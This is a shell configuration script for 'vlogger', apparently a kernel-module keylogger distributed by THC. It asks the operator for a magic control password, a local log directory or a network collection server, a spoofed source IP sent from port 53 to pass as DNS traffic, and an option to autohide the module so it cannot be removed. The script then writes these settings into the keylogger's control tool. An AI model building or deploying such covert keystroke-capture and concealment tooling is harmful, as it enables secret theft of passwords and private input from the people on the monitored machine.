#!/bin/sh
#
# Copyright (C) 2002-2003 rd <rd@thc.org>
#
# This script handles all aspects of configuring the vlogger.
 

# get user input data
getdata() {
	local myvar="$1"
	shift
	# print out the message
	echo -en "$@"
	read data
	if [ ! -z "$data" ] ; then
		eval $myvar="$data"
	fi
	echo
}

PATH=/usr/sbin:/sbin:/usr/bin:/bin:/usr/local/sbin:/usr/local/bin
export PATH

umask 022

clear
head -10 README
echo
cat NOTICE
echo

# start configuration
echo -n "Continue y/N? [N]: "
read answer
[ "${answer#[yY]}" = "$answer" ] && exit 1
echo

# Config vlogger options
MAGIC_PASS=""

while [ -z "$MAGIC_PASS" ] ; do
	getdata MAGIC_PASS "Please choose magic password for logmode switching (echoed): "
done

# Set timezone
TIMEZONE=`date +"%z" | awk '{ print $1/100; }'`
getdata TIMEZONE "Please choose timezone (offset to GMT, from -12 to 13) [$TIMEZONE]: "

# Log method
# 0: local file, 1: network
LOG_METHOD=0
getdata LOG_METHOD "Please choose log method (0: local file, 1: network) [$LOG_METHOD]: "

# Default log mode
# 0: nolog, 1: dumb, 2: smart
LOG_MODE=1
getdata LOG_MODE "Please choose default log mode (0: nolog, 1: dumb, 2: smart) [$LOG_MODE]: "

if [ $LOG_METHOD -eq 0 ] ; then
	LOG_DIR=""
		
	while [ -z "$LOG_DIR" ] ; do
		getdata LOG_DIR "In which directory do you want to save log data: "
	done
	
	if [ ! -d "$LOG_DIR" ]; then
		mkdir -p $LOG_DIR || exit $?
	fi
else
	SRC_IP=""
	getdata SRC_IP "Fake source IP address (enter to use IP of output device) [none]: "

	SRC_PORT="53"
	getdata SRC_PORT "Source port [$SRC_PORT]: "

	DEST_IP=""
	while [ -z "$DEST_IP" ] ; do
		getdata DEST_IP "vlogger server's IP address: "
	done

	DEST_PORT="1337"
	getdata DEST_PORT "Destination port [$DEST_PORT]: "
fi

HIDE=0
echo -n "Autohide vlogger module after loaded (you can't remove vlogger after that) y/N? [N]: "
read answer

[ ! "${answer#[yY]}" = "$answer" ] && HIDE=1

# Update vlogctrl 
echo -e "Updating vlogctrl ..."
sed -e "s#MAGIC_PASS=\(.*\)#MAGIC_PASS=$MAGIC_PASS#; \
	s#LOG_MODE=\(.*\)#LOG_MODE=$LOG_MODE#; \
	s#LOG_METHOD=\(.*\)#LOG_METHOD=$LOG_METHOD#; \
	s#TIMEZONE=\(.*\)#TIMEZONE=$TIMEZONE#; \
	s#LOG_DIR=\(.*\)#LOG_DIR=$LOG_DIR#; \
	s#HIDE=\(.*\)#HIDE=$HIDE#; \
	s#SRC_IP=\(.*\)#SRC_IP=$SRC_IP#; \
	s#SRC_PORT=\(.*\)#SRC_PORT=$SRC_PORT#; \
	s#DEST_IP=\(.*\)#DEST_IP=$DEST_IP#; \
	s#DEST_PORT=\(.*\)#DEST_PORT=$DEST_PORT#; " \
	> ./vlogctrl < ./vlogctrl.gen || exit $?

chmod +x ./vlogctrl

echo Done!

